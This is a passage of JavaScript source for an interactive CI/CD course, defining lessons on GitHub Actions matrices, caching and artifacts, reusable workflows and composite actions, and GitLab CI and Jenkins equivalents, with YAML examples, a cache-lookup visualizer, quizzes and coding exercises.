    aiEra: `<p>🤖 AI is good at <b>expanding</b> a matrix or splitting one job into several, and bad at checking the graph afterwards: it often forgets a <code>needs</code>, so a deploy runs in parallel with the tests, or it adds <code>cancel-in-progress: true</code> to a deploy. Draw the job graph from the generated YAML yourself, and ask "what is the critical path and what is the failure behaviour?" before accepting it.</p>
      <p>🤖 AI-generated test suites grow quickly, and so do pipelines. Ask your assistant for a timing report from the run logs (the Actions API gives per-job and per-step durations) and decide with data which job is on the critical path.</p>`,
    problems: [P({
      t: 'Test matrix with exclusions, a gated build and PR cancellation', l: 'Medium', tags: ['matrix', 'needs', 'concurrency', 'github actions'], co: ['Microsoft', 'Flipkart', 'Capgemini'],
      s: `<p>Your library supports Python 3.10, 3.11 and 3.12 on Linux and macOS, but 3.10 on macOS is not supported. Write a workflow where: tests run for the allowed combinations without cancelling each other on first failure; a <code>build</code> job runs only if all test jobs pass and exposes the package version as an output; and when you push again to the same PR the previous run is cancelled, but pushes to <code>main</code> are never cancelled.</p>`,
      ex: `<p>Matrix: 3 versions x 2 OS = 6, minus macos/3.10 → ${H.c('g', '5 test jobs')}. Two quick pushes to a PR → ${H.c('y', 'first run cancelled')}. Two quick pushes to main → ${H.c('g', 'both complete')}.</p>`,
      bw: `<p>Copy-pasting five near-identical jobs, no <code>needs</code> (build runs even when tests fail), and no concurrency (ten pushes during review means ten full runs, nine of them useless).</p>`,
      q: ['Why use <code>cancel-in-progress: @{{ github.ref != \'refs/heads/main\' }}</code> instead of plain <code>true</code>?', ['So runs on main always finish, because they produce the artifact people deploy', 'It makes cancellations faster', 'Plain true is invalid syntax', 'It lets cancelled runs resume later'], 0, 'On a PR only the latest commit matters. On main every merge commit should be built and recorded, so you only cancel when the ref is not main.'],
      h: ['<p>Hint 1: <code>strategy.matrix</code> with <code>python</code> and <code>os</code> lists, then <code>exclude</code> with one object.</p>', '<p>Hint 2: <code>fail-fast: false</code> is on the <code>strategy</code>, next to <code>matrix</code>.</p>', '<p>Hint 3: the group should include the ref, and cancel-in-progress can be an expression.</p>'],
      a: `<p>One matrix job replaces six copies. <code>fail-fast: false</code> shows every broken combination at once. <code>needs: test</code> means the build job starts only when <b>all</b> matrix legs succeed. Job outputs carry the version. The concurrency group is per workflow and ref, and it cancels only when the ref is not main.</p>`,
      code: Y(R`name: library
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: lib-@{{ github.workflow }}-@{{ github.ref }}
  cancel-in-progress: @{{ github.ref != 'refs/heads/main' }}
jobs:
  test:
    runs-on: @{{ matrix.os }}
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        python: ['3.10', '3.11', '3.12']
        exclude:
          - os: macos-latest
            python: '3.10'
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: @{{ matrix.python }}
          cache: pip
      - run: pip install -e '.[test]'
      - run: python -m pytest -q
  build:
    needs: test
    runs-on: ubuntu-latest
    outputs:
      version: @{{ steps.v.outputs.version }}
    steps:
      - uses: actions/checkout@v4
      - id: v
        run: echo "version=$(python -c 'import tomllib;print(tomllib.load(open("pyproject.toml","rb"))["project"]["version"])')" >> "$GITHUB_OUTPUT"
      - run: python -m pip install build && python -m build`, 'library.yml'),
      cx: `<p>5 parallel jobs: wall-clock time is the slowest leg plus the build, instead of 5 legs in a row.</p>`,
      f: ['What changes if the required status check must keep working when you add Python 3.13 to the matrix?', 'How would you run the build job only on main?']
    })]
  });

  // ───────────────────────── Topic 3: caching, artifacts, speed, flaky tests ─────────────────────────
  // Model of actions/cache lookup: exact key wins; otherwise each restore-key is a PREFIX, tried in order, newest match wins.
  function cacheLookup(caches, key, restore) {
    if (caches.indexOf(key) >= 0) return { kind: 'exact', key: key, why: 'the full key matches exactly' };
    for (var r = 0; r < restore.length; r++) {
      for (var i = caches.length - 1; i >= 0; i--) {
        if (caches[i].indexOf(restore[r]) === 0) return { kind: 'partial', key: caches[i], why: 'prefix "' + restore[r] + '" matched, newest first', rk: restore[r] };
      }
    }
    return { kind: 'miss', key: '', why: 'nothing matched' };
  }
  var CACHE_YAML = R`# A manual cache for something setup-* actions do not cover (here: a Gradle-like tool cache)
- uses: actions/cache@v4
  with:
    path: ~/.cache/mytool
    # Exact key: changes whenever the lockfile changes. Caches are immutable, so a new key = a new entry.
    key: mytool-@{{ runner.os }}-@{{ hashFiles('**/lockfile') }}
    # Fallback: restore the newest cache for this OS, then fix only what changed.
    restore-keys: |
      mytool-@{{ runner.os }}-`;
  var ARTIFACT_YAML = R`# Build once, hand the files to later jobs. Each job starts on a clean machine, so files must be uploaded.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make dist
      - uses: actions/upload-artifact@v4
        with:
          name: dist-@{{ github.sha }}          # v4 artifacts are immutable: names must be unique per run
          path: dist/
          retention-days: 7                    # default is 90 days; keep storage small
          if-no-files-found: error             # an empty upload is a bug, not a success
  smoke:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist-@{{ github.sha }}
          path: dist/
      - run: ls -l dist/ && ./dist/app --version`;
  var SHARD_YAML = R`# Split a slow test suite into 4 parallel shards (Jest and Playwright both support --shard=N/M)
jobs:
  e2e:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npx playwright test --shard=@{{ matrix.shard }}/4
      - if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: e2e-report-@{{ matrix.shard }}   # unique name per shard
          path: playwright-report/
          retention-days: 5

  ci-ok:                                       # the ONE job branch protection requires
    if: always()
    needs: [e2e]
    runs-on: ubuntu-latest
    steps:
      - name: Fail if any needed job did not succeed
        env:
          RESULTS: @{{ toJSON(needs.*.result) }}
        run: |
          echo "needed results: $RESULTS"
          if echo "$RESULTS" | grep -Eq 'failure|cancelled'; then exit 1; fi`;

  topics.push({
    title: 'Caching, Artifacts and Making Pipelines Fast',
    analogy: `<p>A <b>cache</b> is the sous-chef's prepped onions from yesterday: if the recipe still calls for the same onions, you grab the bowl instead of chopping again, and if it is nearly the same (a bit more garlic), you start from yesterday's bowl and add the difference. An <b>artifact</b> is the finished plate on the pass: it is the actual output of one station, handed to the next, and you keep a photo of it for the record. Caches make work <i>faster</i> and may be missing; artifacts are <i>results</i> and must be exact.</p>`,
    explain: `<p>🟢 <b>Two different tools.</b> People confuse them constantly.</p>
      ${H.table(['', 'Cache', 'Artifact'], [
        ['Purpose', 'speed: skip re-downloading or re-building things that did not change', 'results: pass files between jobs or keep them after the run'],
        ['If it is missing', 'the pipeline still works, only slower', 'the pipeline is broken'],
        ['Identity', 'a <b>key</b> you design (usually a hash of the lockfile)', 'a <b>name</b> inside one run'],
        ['Lifetime', 'evicted after 7 days unused, 10 GB per repository, oldest first', '<code>retention-days</code>, default 90'],
        ['Actions', '<code>actions/cache@v4</code>, or <code>cache:</code> in <code>setup-node@v4</code> / <code>setup-python@v5</code>', '<code>actions/upload-artifact@v4</code> and <code>download-artifact@v4</code>']
      ])}
      <p>🟢 <b>The easy win.</b> <code>setup-node</code>, <code>setup-python</code>, <code>setup-java</code> and <code>setup-go</code> have a built-in <code>cache:</code> option that does the key for you. Use it first. Reach for <code>actions/cache</code> only for things they do not cover.</p>
      <p>🔵 <b>How a cache key works.</b> You give a <code>key</code> and optional <code>restore-keys</code>. GitHub looks for an <b>exact</b> match first. If none, it tries each restore key as a <b>prefix</b>, in the order you listed, and takes the <b>newest</b> cache that starts with it (a "partial hit", and the step reports <code>cache-hit: false</code>). On a successful job, a cache is saved under the exact key unless that key already exists. Caches are <b>immutable</b>: you never update one, you create a new key.</p>
      <p>🔵 <b>Good keys.</b> Include what changes the content (the OS, the tool version, the hash of the lockfile) and nothing that changes every run. <code>key: npm-@{{ runner.os }}-@{{ hashFiles('**/package-lock.json') }}</code> is the classic. A key with <code>github.sha</code> never hits, because every commit is new.</p>
      <p>🔵 <b>Scope and safety.</b> A run can read caches from its own branch and from the base and default branches, but not from sibling branches. That stops a PR from poisoning main's cache. Never cache secrets or anything you would not want another job on the same branch to read.</p>
      <p>🔵 <b>Faster in six moves.</b> (1) Path filters, (2) dependency cache, (3) run independent jobs in parallel, (4) shard the slowest test job, (5) cancel superseded runs, (6) build the Docker image with layer cache (<code>cache-from: type=gha</code>). The visualizer shows how a key lookup resolves.</p>`,
    clues: [
      '"npm install takes 4 minutes on every run" → dependency cache keyed on the lockfile (<code>cache: npm</code> in setup-node)',
      '"The cache never hits" → the key contains something that changes every run (a SHA, a timestamp), or the lockfile path in <code>hashFiles</code> is wrong',
      '"Pass the compiled binary to the deploy job" → artifact (upload in one job, download in the next), not cache',
      '"Pipeline went from 25 to 6 minutes" → path filters, caches, parallel jobs, sharded tests, cancelled stale runs (say all five)',
      '"Two tests fail randomly and block merges" → flaky tests: quarantine, retry with a record, fix root cause; never just rerun forever',
      '"Required check never reports on docs-only PRs" → an always-running aggregate job (<code>ci-ok</code>), not the path-filtered job itself'
    ],
    code: [Y(CACHE_YAML), Y(ARTIFACT_YAML), Y(SHARD_YAML)],
    codeTitle: ['actions/cache with an exact key and restore-keys', 'Artifacts between jobs (build once, use many)', 'Sharded tests plus one aggregate required check'],
    viz: [{
      title: 'Cache lookup: exact key, then restore-keys prefixes',
      input: 'caches: npm-linux-aaa, npm-linux-bbb, npm-mac-ccc | key: npm-linux-ddd | restore: npm-linux-, npm-',
      inputLabel: 'caches (oldest to newest) | key | restore keys (comma separated)',
      gen: function (input) {
        var m = String(input || '').match(/^\s*caches:\s*(.*?)\s*\|\s*key:\s*(.*?)\s*\|\s*restore:\s*(.*)$/i);
        if (!m) throw new Error('Format: caches: a-1, a-2 | key: a-3 | restore: a-, b-');
        var caches = m[1].split(',').map(function (s) { return s.trim(); }).filter(Boolean);
        var key = m[2].trim(), restore = m[3].split(',').map(function (s) { return s.trim(); }).filter(Boolean);
        if (!key || caches.length > 10 || restore.length > 5) throw new Error('Need a key; at most 10 caches and 5 restore keys');
        var frames = [], hl = {};
        function rows(mark) { return caches.map(function (c, i) { return [i + 1, c, mark && mark[i] ? mark[i] : '']; }); }
        function tbl(mark, h) { return { type: 'table', label: 'caches stored in the repo (1 = oldest)', columns: ['#', 'cache key', 'check'], rows: rows(mark), hl: h || {} }; }
        frames.push({ narr: 'The job asks for <code>key: ' + H.esc(key) + '</code>' + (restore.length ? ' with restore-keys ' + H.esc(restore.join(', ')) : ' and no restore-keys') + '. Caches are immutable entries, listed oldest to newest.', parts: [tbl(null)] });
        var ex = caches.indexOf(key);
        if (ex >= 0) {
          frames.push({ narr: '<b class="c-g">Exact hit.</b> Entry ' + (ex + 1) + ' equals the key, so it is restored and <code>cache-hit</code> is <code>true</code>. Restore-keys are never consulted. Nothing new is saved at the end because the key already exists.', parts: [tbl(one(ex, 'EXACT'), one(ex, 'ok'))] });
          return pad4(frames, 'Done.');
        }
        var mark = {};
        caches.forEach(function (c, i) { mark[i] = 'differs'; });
        frames.push({ narr: 'No entry equals the full key, so this is an <b>exact miss</b>. Now each restore key is tried as a <b>prefix</b>, in the order you wrote them.', parts: [tbl(mark, {})] });
        var found = null;
        for (var r = 0; r < restore.length && !found; r++) {
          var h = {}, mk = {}, best = -1;
          caches.forEach(function (c, i) { if (c.indexOf(restore[r]) === 0) { mk[i] = 'starts with'; best = i; } else mk[i] = 'no'; });
          if (best >= 0) { h[best] = 'ok'; found = { i: best, rk: restore[r] }; }
          frames.push({ narr: 'Restore key <code>' + H.esc(restore[r]) + '</code>: ' + (best >= 0 ? 'entries that start with it are marked; GitHub takes the <b>newest</b>, entry ' + (best + 1) + '.' : 'no entry starts with this prefix, so try the next restore key.'), parts: [tbl(mk, h)] });
        }
        if (found) frames.push({ narr: '<b class="c-y">Partial hit.</b> Entry ' + (found.i + 1) + ' (<code>' + H.esc(caches[found.i]) + '</code>) is restored; <code>cache-hit</code> is <code>false</code>. The tool then installs only what differs, and at the end the job saves a <b>new</b> cache under <code>' + H.esc(key) + '</code>. Order matters: put the most specific prefix first.', parts: [tbl(one(found.i, 'RESTORED'), one(found.i, 'sel'))] });
        else frames.push({ narr: '<b class="c-r">Cache miss.</b> Nothing matched, so the job starts cold (slow once), then saves a new cache under <code>' + H.esc(key) + '</code> for next time.', parts: [tbl(null)] });
        return pad4(frames, 'Done.');
      }
    }],
    examples: [
      { title: 'Situation: a 25-minute pipeline cut to 6', html: `<p>Before: one job did install (4 min), lint (2), unit (6), e2e (9), image build (4) in a row = 25. After, each change is small and measurable:</p>${H.table(['Change', 'Saves', 'Run time after'], [['npm cache via <code>cache: npm</code>', '3 min', '22'], ['lint, unit, e2e as parallel jobs', '(2+6+9) becomes max 9', '10 + overhead'], ['e2e in 3 shards', '9 becomes 3', '~6.5'], ['Docker layer cache', '4 becomes 1', '~5.5'], ['cancel superseded PR runs', 'queue time', 'feels like 6']])}<p>Order matters: measure first (the Actions UI shows each step's time), fix the biggest block on the critical path, measure again.</p>` },
      { title: 'Situation: flaky tests blocking merges', html: `<p>Two end-to-end tests fail about 1 run in 8 for reasons unrelated to the change. Developers learn to click "re-run" and stop trusting red. Three honest moves: (1) <b>measure</b> by recording failures per test; (2) <b>quarantine</b>: move the flaky tests to a separate non-required job so main stays unblocked, with a ticket and an owner and a deadline; (3) <b>fix the cause</b> (usually shared state, time, ordering or waiting for a fixed time instead of a condition). A retry of 1-2 is acceptable for known-network tests only if the pipeline <i>reports</i> retries. Never use <code>continue-on-error: true</code> on a required job to hide red.</p>` },
      { title: 'Docker layer cache in Actions', html: `<p>With Buildx, the GitHub cache backend stores image layers so unchanged layers are not rebuilt (Docker module: Cloud & DevOps 8).</p>`, code: Y(R`- uses: docker/setup-buildx-action@v3
- uses: docker/build-push-action@v6
  with:
    context: .
    push: false
    tags: app:ci
    cache-from: type=gha
    cache-to: type=gha,mode=max`, 'Layer cache with the gha backend') },
      { title: 'Saving cache only on main', html: `<p>PR branches create many small caches and can evict useful ones. A common pattern is to <code>restore</code> everywhere but <code>save</code> only on main using the split actions <code>actions/cache/restore@v4</code> and <code>actions/cache/save@v4</code> with <code>if: github.ref == 'refs/heads/main'</code> on the save step. PRs still read main's cache through scope rules.</p>` }
    ],
    deepDive: `<p>🟣 <b>Eviction and thrash.</b> The 10 GB repo limit is shared by every branch. A matrix with large per-OS caches, plus many PR branches, can evict the main cache that everyone depends on, so the "fast" pipeline mysteriously slows. Check the Caches page, keep keys few and meaningful, and restrict saves to main when churn is high.</p>
      <p>🟣 <b>Restore-keys are a trade.</b> A partial hit gives you a mostly-warm cache, but it can carry stale files into a build (for example outdated compiled output). For package downloads it is nearly always safe because the package manager verifies the lockfile. For build outputs (target folders, <code>.gradle</code>), prefer exact keys or clean after restore.</p>
      <p>🟣 <b>Artifacts v4.</b> v4 uploads are immutable and appear instantly in the UI, and two jobs cannot upload the same name (use unique names, or <code>merge-multiple: true</code> on download with a pattern for shards). Upload the <b>smallest</b> thing that proves the result, and set a short retention. Artifacts are visible to anyone with read access to the repo (public repos: everyone), so never upload <code>.env</code> files or whole workspaces, and remember <code>actions/checkout</code> leaves a credential in <code>.git/config</code> unless you set <code>persist-credentials: false</code>.</p>
      <p>🟣 <b>Sharding maths.</b> Splitting a 9-minute suite into 3 shards gives about 3 minutes plus 1 minute of per-shard setup, so ~4, not 3. Balanced shards need test timing data; naive file-count splitting leaves one shard 2x slower, and the slowest shard sets the time (the critical path again).</p>
      <p>🟣 <b>Merge gates.</b> Pair required status checks with a <b>merge queue</b> (<code>on: merge_group</code> must run the same checks). The queue tests each PR on top of the PRs ahead of it, so two individually-green PRs cannot break main together.</p>`,
    aiEra: `<p>🤖 AI tools can read a slow run's logs and point at the likely bottleneck, and they are good at proposing cache keys and shards. They are weaker on <b>correctness of keys</b>: a cache key that hashes the wrong file, or a restore-key that is too broad, still "works" and quietly serves stale output. Verify with two runs: change nothing (expect an exact hit) and change the lockfile (expect a partial hit).</p>
      <p>🤖 Flaky tests are increasingly produced by AI-written tests with real sleeps or shared state. Ask the assistant to rewrite waits as condition-based waits, and to find the shared state, rather than asking it to add retries.</p>`,
    problems: [P({
      t: 'Pick the cache that a restore-key would restore', l: 'Medium', tags: ['cache', 'restore-keys', 'python', 'github actions'], co: ['GitHub', 'JPMorgan', 'Zoho'],
      s: `<p>Write the cache step for a <code>pnpm</code> store in GitHub Actions: an exact key from the OS and the lockfile hash, and restore-keys that fall back to the newest cache for the same OS. Then, to be sure you understand it, write <code>cache_restore(caches, key, restore_keys)</code>. <code>caches</code> is the list of stored keys from oldest to newest. Return <code>"exact:KEY"</code> if the key is stored; otherwise try the restore keys in order as prefixes and return <code>"partial:KEY"</code> for the <b>newest</b> stored key that starts with the first prefix that matches anything; otherwise <code>"miss"</code>.</p>`,
      c: PYC,
      ex: `<p>Stored (oldest first): <code>["npm-linux-111", "npm-linux-222", "npm-mac-333"]</code>, key <code>npm-linux-444</code>, restore <code>["npm-linux-", "npm-"]</code> → ${H.c('y', '"partial:npm-linux-222"')}: no exact match; the first prefix matches two entries and the newest of them wins. The mac cache is newer overall but is never offered because the more specific prefix matched first.</p>`,
      bw: `<p>Using <code>key: pnpm-@{{ github.sha }}</code>: every commit has a new SHA, so there is never an exact hit, and with no restore-keys there is never a partial one either. The cache is saved (wasting space) but never used.</p>`,
      bc: Y(R`- uses: actions/cache@v4
  with:
    path: ~/.local/share/pnpm/store
    key: pnpm-@{{ github.sha }}     # new on every commit: always a miss`, 'naive: key changes every run'),
      q: ['The exact key misses and two restore-key prefixes both match some entries. Which is used?', ['The first listed prefix that matches anything (newest entry for that prefix)', 'The overall newest entry across all prefixes', 'The longest prefix', 'The job fails'], 0, 'Restore keys are tried in the order written. The first prefix with any match decides, and among its matches GitHub takes the most recently created. So list the most specific prefix first.'],
      h: ['<p>Hint 1: check <code>key in caches</code> first and return immediately.</p>', '<p>Hint 2: loop over restore keys in order; inside, scan <code>caches</code> from newest to oldest.</p>', '<p>Hint 3: use <code>startswith</code>; return <code>"miss"</code> after the loops.</p>'],
      a: `<p>The YAML uses an exact key that changes only when the lockfile does, plus a restore key that matches the newest cache for the same OS. The function mirrors that rule: exact first, then prefixes in order, newest first, else a miss.</p>`,
      code: Y(R`- uses: pnpm/action-setup@v4
  with:
    version: 9
- uses: actions/cache@v4
  with:
    path: ~/.local/share/pnpm/store
    key: pnpm-@{{ runner.os }}-@{{ hashFiles('**/pnpm-lock.yaml') }}
    restore-keys: |
      pnpm-@{{ runner.os }}-`, 'pnpm store cache'),
      alt: [PY(R`def cache_restore(caches, key, restore_keys):
    if key in caches:
        return "exact:" + key                      # exact hit wins, restore-keys are ignored
    for prefix in restore_keys:                    # restore keys are tried in the order written
        for stored in reversed(caches):            # caches are oldest -> newest, so scan newest first
            if stored.startswith(prefix):
                return "partial:" + stored
    return "miss"`, 'cache_restore (tested)')],
      cx: `<p>O(R x C) for R restore keys and C stored caches. GitHub does this server side in milliseconds.</p>`,
      f: ['What would you change so PRs read but never write caches?', 'Why can a partial hit make a build output folder unsafe?'],
      tests: { sig: 'string[] string string[] -> string', fn: 'cacheRestore', cases: [
        [[['a-1', 'b-2'], 'b-2', []], 'exact:b-2'],
        [[['npm-linux-111', 'npm-linux-222', 'npm-mac-333'], 'npm-linux-444', ['npm-linux-', 'npm-']], 'partial:npm-linux-222'],
        [[['npm-linux-111', 'npm-linux-222', 'npm-mac-333'], 'npm-mac-999', ['npm-mac-', 'npm-']], 'partial:npm-mac-333'],
        [[['npm-linux-111', 'npm-linux-222', 'npm-mac-333'], 'npm-win-1', ['npm-win-', 'npm-']], 'partial:npm-mac-333'],
        [[['npm-1'], 'x', []], 'miss'],
        [[[], 'k', ['k-']], 'miss'],
        [[['k-1', 'k-2', 'k-3'], 'k-1', ['k-']], 'exact:k-1'],
        [[['a-1', 'b-1'], 'z', ['a-', 'b-']], 'partial:a-1'],
        [[['a-1', 'b-1'], 'z', ['b-', 'a-']], 'partial:b-1'],
        [[['pip-3.11-aa', 'pip-3.12-bb', 'pip-3.12-cc'], 'pip-3.12-dd', ['pip-3.12-', 'pip-']], 'partial:pip-3.12-cc'],
        [[['pip-3.11-aa'], 'pip-3.12-dd', ['pip-3.12-']], 'miss'],
        [[['x'], 'x', ['x']], 'exact:x']
      ] }
    })]
  });

  // ───────────────────────── Topic 4: reuse, GitLab CI, Jenkins ─────────────────────────
  var REUSABLE = R`# .github/workflows/build.yml  (the REUSABLE workflow: a function other workflows call)
name: build
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '22'
    outputs:
      artifact:
        description: 'Name of the uploaded build artifact'
        value: @{{ jobs.build.outputs.artifact }}
    secrets:
      NPM_TOKEN:
        required: false             # a placeholder name; the caller supplies the value
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      artifact: @{{ steps.name.outputs.artifact }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: @{{ inputs.node-version }}
          cache: npm
      - run: npm ci && npm run build
        env:
          NPM_TOKEN: @{{ secrets.NPM_TOKEN }}
      - id: name
        run: echo "artifact=site-@{{ github.sha }}" >> "$GITHUB_OUTPUT"
      - uses: actions/upload-artifact@v4
        with:
          name: @{{ steps.name.outputs.artifact }}
          path: dist/`;
  var CALLER = R`# .github/workflows/release.yml  (the CALLER)
name: release
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  build:
    uses: ./.github/workflows/build.yml          # same repo; for another repo: org/repo/.github/workflows/build.yml@<full-sha>
    with:
      node-version: '22'
    secrets:
      NPM_TOKEN: @{{ secrets.NPM_TOKEN }}          # pass only what is needed (avoid "secrets: inherit")
  report:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "built artifact @{{ needs.build.outputs.artifact }}"`;
  var COMPOSITE = R`# .github/actions/setup-app/action.yml  (a COMPOSITE action: a bundle of steps, used inside a job)
name: setup-app
description: Check out, install Node with cache, and install dependencies
inputs:
  node-version:
    description: Node version
    default: '22'
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v4
      with:
        node-version: @{{ inputs.node-version }}
        cache: npm
    - run: npm ci
      shell: bash                       # composite run steps MUST name a shell
# Use it from a job (after actions/checkout):
#   - uses: ./.github/actions/setup-app
#     with: { node-version: '20' }`;
  var GITLAB = R`# .gitlab-ci.yml  (GitLab CI equivalent of the Node pipeline)
stages: [test, build, deploy]

workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

default:
  image: node:22
  interruptible: true                     # like cancel-in-progress for superseded pipelines
  cache:
    key:
      files: [package-lock.json]          # like hashFiles('package-lock.json')
    paths: [.npm/]

variables:
  npm_config_cache: "$CI_PROJECT_DIR/.npm"

test:
  stage: test
  parallel:
    matrix:                               # like strategy.matrix
      - NODE_VERSION: ["20", "22"]
  image: node:$NODE_VERSION
  script:
    - npm ci
    - npm test

build:
  stage: build
  needs: [test]                           # like needs: (DAG)
  script:
    - npm ci && npm run build
  artifacts:                              # like upload-artifact
    paths: [dist/]
    expire_in: 7 days

deploy_production:
  stage: deploy
  needs: [build]
  environment:
    name: production                      # like a GitHub environment
  resource_group: production              # like a concurrency group: one deploy at a time
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual                        # like required reviewers: a person clicks play
  script:
    - ./scripts/deploy.sh dist/`;
  var JENKINS = R`// Jenkinsfile  (declarative pipeline; Groovy, so it is shown with lang text and no syntax check)
pipeline {
  agent { docker { image 'node:22' } }                 // like runs-on + container
  options {
    timeout(time: 15, unit: 'MINUTES')                 // like timeout-minutes
    disableConcurrentBuilds(abortPrevious: true)       // like concurrency + cancel-in-progress
  }
  stages {
    stage('Install') { steps { sh 'npm ci' } }
    stage('Test') {
      steps { sh 'npm test' }
      post { always { junit 'reports/junit.xml' } }    // publish test results even on failure
    }
    stage('Build') {
      steps { sh 'npm run build' }
      post { success { archiveArtifacts artifacts: 'dist/**', fingerprint: true } }   // like upload-artifact
    }
    stage('Deploy to production') {
      when { branch 'main' }
      options { lock('production') }                   // like a concurrency group (Lockable Resources plugin)
      steps {
        input message: 'Deploy to production?', submitter: 'release-managers'   // like required reviewers
        withCredentials([string(credentialsId: 'deploy-token', variable: 'DEPLOY_TOKEN')]) {  // like secrets.NAME
          sh './scripts/deploy.sh dist/'
        }
      }
    }
  }
  post { failure { echo 'Pipeline failed: notify the team here' } }
}`;
  var MAP = {
    trigger: ['on: push / pull_request', 'workflow: rules: / rules: if', 'triggers { } and multibranch pipeline'],
    job: ['jobs.&lt;id&gt;', 'a job with stage:', 'stage(...) { steps { } }'],
    runner: ['runs-on: ubuntu-latest', 'tags: or image: (runner executor)', 'agent { label ... }'],
    needs: ['needs: [build]', 'needs: [build] (DAG) or stages order', 'stages run in order; parallel { } blocks'],
    matrix: ['strategy.matrix', 'parallel: matrix:', 'matrix { axes { } } block'],
    cache: ['actions/cache@v4 or cache: in setup-*', 'cache: key: files:', 'a cache plugin or a persistent workspace volume'],
    artifact: ['actions/upload-artifact@v4', 'artifacts: paths:', 'archiveArtifacts'],
    secret: ['secrets.NAME', 'masked CI/CD variable (Settings)', 'credentials() / withCredentials'],
    environment: ['environment: production', 'environment: name: production', 'a stage with input and lock'],
    approval: ['environment required reviewers', 'when: manual (and protected environments)', 'input step with submitter'],
    concurrency: ['concurrency: group', 'resource_group: / interruptible:', 'lock() / disableConcurrentBuilds'],
    reuse: ['workflow_call, composite action', 'include: and extends:', 'shared library (vars/ and src/)']
  };

  topics.push({
    title: 'Reusable Workflows, Composite Actions, GitLab CI and Jenkins',
    analogy: `<p>Writing the same pipeline into forty repositories is like <b>every restaurant in a chain writing its own recipe for tomato sauce</b>. One cook improves it and thirty-nine kitchens never find out. A <b>reusable workflow</b> is the central kitchen that makes the sauce: branches call it and pass in quantities. A <b>composite action</b> is a labelled prep tray ("onions, chopped, 5 kg") that any station can pick up. Jenkins and GitLab CI are different kitchen brands: the stations have different names, but the same ideas.</p>`,
    explain: `<p>🟢 <b>Two ways to reuse in GitHub Actions.</b></p>
      ${H.table(['', 'Reusable workflow', 'Composite action'], [
        ['What it is', 'a whole workflow with <code>on: workflow_call</code>', 'a bundle of steps in <code>action.yml</code>'],
        ['Called from', 'a <b>job</b>: <code>jobs.x.uses: org/repo/.github/workflows/build.yml@ref</code>', 'a <b>step</b>: <code>steps: - uses: ./.github/actions/setup-app</code>'],
        ['Brings its own', 'runners, jobs, environments, permissions, secrets', 'only steps, running on the caller\'s runner'],
        ['Inputs / outputs', '<code>inputs</code>, <code>secrets</code>, <code>outputs</code>', '<code>inputs</code>, <code>outputs</code> (no secrets: pass them as inputs)'],
        ['Use it for', 'a standard "build, test, publish" used by many repos', 'a repeated setup (checkout + node + install) inside many jobs']
      ])}
      <p>🟢 <b>Same ideas, different words.</b> Every CI system has: a trigger, units of work on a machine, an order between them, a cache, saved outputs, secrets, and a gate before production. Learn the concept once, then translate. The visualizer lists the mapping for GitHub Actions, GitLab CI and Jenkins.</p>
      <p>🔵 <b>Reusable workflow rules.</b> The caller passes <code>with:</code> and <code>secrets:</code>. Secrets do <b>not</b> flow automatically; <code>secrets: inherit</code> passes them all, which is convenient but widens the blast radius, so name them. Call workflows in other repos only when you control that repo, and pin them to a full commit SHA or a protected tag. Reusable workflows can be nested to a limited depth, and a caller's <code>permissions</code> can only be narrowed by the callee, never widened.</p>
      <p>🔵 <b>Composite action rules.</b> Every <code>run:</code> step needs a <code>shell:</code>. A composite action cannot use <code>secrets.</code> directly, cannot define <code>if:</code> at job level, and shows as a single step in the log (less detail). Put it in the same repo (<code>./.github/actions/...</code>) when it is repo-specific, or in its own repo when shared.</p>
      <p>🔵 <b>GitLab CI.</b> One file, <code>.gitlab-ci.yml</code>. <code>stages</code> define order, <code>needs</code> builds a DAG, <code>rules</code> decide when a job runs, <code>include</code> and <code>extends</code> give reuse, <code>environment</code> plus <code>when: manual</code> gives a gated deploy, <code>resource_group</code> serialises deploys.</p>
      <p>🔵 <b>Jenkins.</b> A <code>Jenkinsfile</code> (declarative pipeline, written in a Groovy-based syntax) in the repo, run by a Jenkins server you operate. <code>agent</code> says where, <code>stages/steps</code> say what, <code>post</code> handles success/failure, <code>input</code> is the approval, shared libraries give reuse. You own plugins and upgrades, which is the real cost of Jenkins.</p>`,
    clues: [
      '"Forty repos copy-paste the same build pipeline" → a reusable workflow (<code>workflow_call</code>) in one central repo, called with <code>with:</code> and named secrets',
      '"The same four setup steps appear in every job" → a composite action',
      '"Which should I use, reusable workflow or composite action?" → whole jobs/secrets/environments = reusable workflow; repeated steps inside a job = composite action',
      '"We are moving from Jenkins to GitHub Actions" → map agent→runs-on, stage→job, input→environment reviewers, shared library→reusable workflow',
      '"Our GitLab pipeline needs a manual production button" → <code>when: manual</code> on a job with a protected <code>environment</code>',
      '"Why not self-host Jenkins?" → total cost of plugins, upgrades, agents and security patches versus a managed service'
    ],
    code: [Y(REUSABLE, 'build.yml (reusable workflow)'), Y(CALLER, 'release.yml (caller)'), Y(COMPOSITE, 'action.yml (composite action)'), Y(GITLAB, '.gitlab-ci.yml'), JF(JENKINS, 'Jenkinsfile')],
    codeTitle: ['A reusable workflow', 'Calling it and reading its output', 'A composite action', 'The same pipeline in GitLab CI', 'The same pipeline as a Jenkinsfile'],
    viz: [{
      title: 'Translate a concept: GitHub Actions to GitLab CI to Jenkins',
      input: 'trigger, job, needs, matrix, cache, artifact, secret, approval, concurrency',
